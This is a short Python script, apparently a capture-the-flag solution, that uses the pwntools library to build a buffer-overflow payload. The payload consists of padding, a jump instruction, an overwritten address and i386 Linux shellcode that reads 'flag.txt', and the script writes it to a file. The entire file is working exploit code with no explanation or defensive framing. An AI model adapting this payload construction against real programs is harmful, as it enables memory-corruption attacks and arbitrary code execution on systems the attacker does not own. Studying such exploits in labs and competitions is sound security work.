import pwn

payload = b"A" * 24
payload += b"\xeb\x08\x90\x90"
payload += pwn.p32(0x0808586b)
#payload += b"x90" * 8
payload += b"C"*500
payload += pwn.asm(pwn.shellcraft.i386.linux.cat("flag.txt"))

# Write binary data
with open("payload.txt", "wb") as f:
    f.write(payload)

